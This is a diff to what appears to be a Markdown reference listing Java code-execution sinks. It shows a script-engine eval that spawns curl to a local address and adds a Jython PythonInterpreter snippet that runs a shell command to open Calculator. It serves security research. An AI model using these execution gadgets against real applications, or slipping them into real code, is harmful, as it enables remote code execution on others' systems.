@@ -327,7 +327,11 @@ if (engine == null)
 engine.eval("var x=new java.lang.ProcessBuilder; x.command(\"curl\",\"http://127.0.0.1:8000/cmd\"); x.start()");
 ```
 - UNIXProcess/ProcessImpl
-
+- org.python.util.PythonInterpreter
+```java
+PythonInterpreter interpreter = new PythonInterpreter();
+interpreter.exec("import os\nos.system('open -na Calculator')");
+```
 ### Expression Language
 - Apache Commons Jxpath <= 1.3(CVE-2022-41852)
 ```java
